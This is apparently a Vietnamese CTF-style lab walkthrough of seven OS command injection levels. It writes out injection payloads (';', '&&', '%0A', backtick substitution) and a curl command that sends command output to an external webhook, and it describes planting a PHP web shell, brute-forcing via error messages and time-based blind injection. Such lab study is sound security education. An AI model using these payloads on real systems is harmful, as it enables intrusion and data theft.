			`( OS ) Command Injection`

I/ Introduction

Một vài lời trước khi bắt đầu bước exploit.

Lỗi này xuất hiện tại tầng kernel của Application

OS command ra lệnh trực tiếp cho hệ điều hành

Đôi khi với các tính năng `đặc biệt`. Developers bắt buộc phải nhờ hệ điều hành xử lý dùm, đó là lí do xuất hiện (OS) Command Injection

Đối với chủng lỗi injection nói chung, Untrust Data rơi đúng vào unsafe method, `nối dài` user input bằng untrust data khiến hệ điều hành không phân biệt được giữa untrust data và user input, và nghĩ đó chỉ là câu lệnh bình thường.

II/ Exploit 

1. Level 1

Giao diện site sẽ trông như thế này, web này sẽ cho bạn sử dụng một vài chức năng như : 

- Ping
- Dig
- Nslookup

Bạn chỉ việc nhập input và chọn function để thực thi

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.001.png)

Xem qua Source-code:

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.002.png)

Ở level này, chưa có một câu điều kiện nào để validate user input cả, ta có thể nhập tuỳ ý

Thử gửi một gói tin bình thường kiểm tra xem web này có kết nối được với mạng hay không

View in Burp

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.003.png)

Theo tài liệu về command OS, ta có thể thấy có các cách để thực hiện nhiều command cùng lúc như là : 

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.004.png)

Vậy thử bắt đầu với `;`

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.005.png)

Nó đã hoạt động ( Vì có validate đâu hehe )

Câu command sẽ trở thành -> timeout 10 ping -c 4 **; ls / #** 2>&1

Tiếp theo `cat file secret`

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.006.png)

1. Level 2

Giao diện của Level 2, vẫn tương tự như level trước, thử View Source-cođe

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.007.png)

Ở đây anh developer đã validate `;`. Ngăn không cho nó xuất hiện trong user input nữa

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.008.png)

Vậy thì ta lại tiếp tục với các ký tự khác để kết hợp nhiều câu lệnh cùng lúc

Ở đây là `&&`

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.009.png)

Command sẽ trở thành -> timeout 10 ping -c 4 **facebook.com** **&& ls / #** 2>&1

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.010.png)

1. Level 3

Giao diện vẫn tương tự, tiếp tục xem source-code

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.011.png)

Ở đây ta có thể thấy anh developer đã phổ cập kiến thức kịp thời, nhưng còn cách nào nữa không ? Lướt lên đọc lại phần tài liệu nhé 

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.012.png)

OK, đáp án là vẫn còn một phương thức, đó là `\n`. 

Nhưng làm thế nào để gửi qua gói tin mà hệ điều hành hiểu là new line nhỉ ?

Tra bảng ASCII, và nhập nó dưới dạng `URL-encode` là `%0A`

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.013.png)

Okey đó là cách thứ nhất. Còn một cách nữa, đó chính là : `Xem docs đi`

Ở đây ý của docs nói rằng, command nó sẽ thực thi cái `kết quả` của việc `thực thi`

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.014.png)

Ở đây tôi đã đổi function thành `dig`. Vì nó nói nhiều hơn nên mình sẽ lợi  dụng nó. 

Còn 2 thằng kia nói ít nên không thực hiện cách này

Thử đặt `ls / ` # trong input

- Vardump ra nguyên câu command sẽ là : 
- timeout 10 dig `ls /` # 2>&1

Command này sẽ thực hiện `dig` **+** với tham số là kết quả của `ls /` ( Là cái đống bin boot dev  …. đó ) 

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.015.png)

Đến đây thì cũng có thể thực hiện tiếp bằng `cat /…secret.txt`

1. Level 4

Lần này thì có vẻ thêm 1 chức năng

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.016.png)

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.017.png)

Các chức năng khác ngoài `backup` không còn được sử dụng được nữa. Có lẽ phải sử dụng thằng này thôi.

Đoạn code này chỉ trả về `thành công` hoặc `không thành công`. Chứ không có trả về full result như những level ban đầu nữa. Nhưng bù lại thì nó **chẳng validate** cái gì

Nhưng hãy quan sát lại level 1, có vẻ website này có kết nối với internet. 

Giả thuyết phải đi đôi với chứng minh, vậy nên tôi truy cập vào `webhook` để nó tự create một trang web mà giống như là mình đang **host** nó vậy

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.018.png)

OK thử sử dụng curl đến url của webhook xem.

Với payload là : 

“1; curl `webhooksite-url`#”

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.019.png)

Ta có thể nhận thấy rằng server này có internet.

Giả thuyết là sẽ gửi kết quả của câu os command đến webhook để mình đọc được gói tin chứa result ở bên trong.

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.020.png)

Ta thử xuất output của `ls /` vào `/tmp/conca.txt` và sau đó gửi đến server webhook bằng url với option -d

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.021.png)

Nhận thấy có một request POST, đọc content chứa kết quả, suy ra

Ta có thể writable vào thư mục tmp

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.022.png)

Tiếp tục cat file để lấy flag thôi

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.023.png)

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.024.png)

1. Level 5

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.025.png)

View source-code

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.026.png)

Level này giống như level trước, nhưng lại có thêm một file config, đọc thử thì ta có thể thấy rằng có thể đã bị phân cách bởi proxy ( Các level trước mình có thể giao tiếp trực tiếp với server, nhưng lần này có lẽ phải `bước qua` proxy mới được )

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.027.png)

Xem docker compose file ta có thể thấy rằng proxy có 2 network 

Để chuyển tiếp đến server, ngăn không cho việc tiếp xúc trực tiếp giữa browser và server.
Và có vẻ như là server này còn thuộc network `no-internet`. Tức là không có mạng, không thể kết nối ra ngoài.

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.028.png)

Nhưng ngoài ra, còn có sự thay đổi trong docker file, level 5 cho phép ta writable vào document root. 

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.029.png)

Tuy biết là thuộc network `no-internet` nhưng vẫn phải thử mới tin được =))

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.030.png)

Và no internet thật =)), không có gói tin nào đến cả

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.031.png)

Tuy vậy, solution đã rất rõ ràng, level này mình chỉ việc viết một cái gì đó vào document root sau đó truy cập vào và đọc thôi. 

Có một cách khác nữa đó chính là bạn có thể viết một con **shell php** vào document root sau đó **rce**. 

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.032.png)

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.033.png)

Truy cập vào /hehe.txt để đọc, khi đã có được kết quả mong muốn, tiếp tục ghi đè lên hehe.txt để đỡ tốn thời gian hehe

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.034.png)

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.035.png)

1. Level 6

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.036.png)

Ở level này tiếp tục lại `hướng nội`, không cho tiếp xúc với bên ngoài internet.

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.037.png)

View source-code, vẫn như cũ. Tuy nhiên, lần này lại mất đi tính năng `writable`.

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.038.png)

Server sẽ trả về `Backup không thành công` nếu như trong result có chứa `zip error`.

Liệu sẽ thế nào nếu ta thao túng được `zip error` ? 

Tạo kịch bản tấn công : 

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.039.png)

Viết một shell script

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.040.png)

Nhảy vào thằng image level 6 và thử shell vừa tạo liệu đã đúng logic chưa

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.041.png)

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.042.png)

Vậy để bypass được level này, ta sẽ tấn công theo kiểu `Brute-Force`

Payload đã có, việc tiếp theo sẽ là tạo một vòng lặp với các điều kiện logic

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.043.png)

Chú thích đã có trong code.

Kết quả : 

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.044.png)

![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.045.png)

1. Level 7 

   ![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.046.png)

   Có một sự thay đổi nhè nhẹ. Giờ nó sẽ không trả lời là `True` hay `False` nữa, mà nó chỉ nói là `đã thực hiện`

   View source-code

   ![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.047.png)

   Đúng như dự đoán.

   Trong tấn công các chủng lỗi injection, nếu như không thể `dựa` vào `response` để đưa ra `kết luận` thì có một cách tấn công đó chính là `blind`.

   Giống như cái tên, `blind` là `mù`, Chúng ta không thể biết được rằng `liệu câu lệnh đã được thực thi hay chưa? Liệu nó có đúng hay không?`

   Thì trong cách tấn công blind này, cách thường sử dụng nhất đó chính là dựa vào thời gian phản hồi của webserver.

   Và sẽ thật tuyệt nếu ta `lại` có thể `thao túng` được thời gian trả về đúng không? 

   ![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.048.png)

   Đã thử và thời gian phản hồi > 2s ( lâu hơn bình thường )

   Tiếp tục làm một vòng lặp với payload trên thôi

   ![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.049.png)

   Kết quả :

   ![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.050.png)

   ![](./images/Aspose.Words.d69b70ba-6268-4c9c-a950-24b1f6137fef.051.png)




